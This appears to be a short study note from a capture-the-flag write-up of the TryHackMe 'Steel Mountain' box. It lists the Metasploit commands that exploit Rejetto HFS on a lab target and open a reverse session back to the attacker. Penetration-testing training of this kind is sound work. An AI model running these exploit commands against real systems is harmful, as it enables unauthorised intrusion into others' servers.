Found exploit in [[PNPT/THM Boxes/SteelMountain/Enumeration|Enumeration]]

# Exploitation
---
- Using Metasploit:
	- ![[Pasted image 20250419044631.png]]
	- `use exploit/windows/http/rejetto_hfs_exec`
	- `set rhosts 10.10.155.147`
	- `set rport 8080`
	- `set lhost tun0`
	- `run`
	- ![[Pasted image 20250419044927.png]]